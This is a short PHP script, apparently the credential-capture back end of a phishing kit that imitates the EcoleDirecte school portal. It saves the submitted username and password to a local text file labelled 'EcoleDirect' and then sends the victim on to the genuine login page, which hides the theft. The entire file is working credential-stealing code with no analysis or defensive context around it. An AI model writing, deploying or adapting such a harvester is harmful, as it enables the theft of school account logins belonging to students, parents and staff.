<?php
file_put_contents("usernames.txt", "EcoleDirect: " . $_POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://www.ecoledirecte.com/login');
exit();
?>
